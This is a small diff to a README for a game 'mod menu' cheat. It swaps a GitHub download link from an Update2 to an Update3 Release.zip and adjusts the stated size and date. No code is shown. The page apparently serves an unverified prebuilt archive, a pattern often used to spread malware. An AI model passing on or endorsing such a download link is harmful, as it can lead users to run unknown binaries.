@@ -11,9 +11,9 @@
 
 ### 📦 Get the ModMenu
 
-[![Download](https://img.shields.io/badge/Download-ModMenu-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/how-to-fish-bsproject-mod-menu/releases/download/Update2/Release.zip)
+[![Download](https://img.shields.io/badge/Download-ModMenu-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/how-to-fish-bsproject-mod-menu/releases/download/Update3/Release.zip)
 
-**Current release:** `v0.7.5` · **Approx. size:** `105 MB` (Update 09-18)
+**Current release:** `v0.7.5` · **Approx. size:** `104 MB` (Update 09-19)
 
 </div>
 
